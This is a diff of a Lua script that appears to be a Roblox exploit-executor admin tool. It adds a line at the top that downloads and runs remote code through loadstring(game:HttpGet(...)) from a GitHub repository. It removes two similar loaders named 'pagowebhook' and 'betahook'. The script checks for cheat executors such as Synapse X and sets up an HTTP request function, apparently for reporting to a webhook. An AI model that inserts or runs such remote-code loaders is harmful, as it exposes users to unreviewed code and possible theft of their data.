@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/Status.lua",true))()
 
 local AdminPrefix = ";" 
 local Players = game:GetService("Players")
@@ -60,7 +61,6 @@ end)
 
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/pagowebhook",true))()
 
 local webhookcheck =
 	is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -155,8 +155,6 @@ Players.PlayerAdded:Connect(function(CKP)
 		BDCheck(CKP, Message)
 	end)
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/betahook",true))()
 
 local request = (syn and syn.request) or (http and http.request) or http_request
 
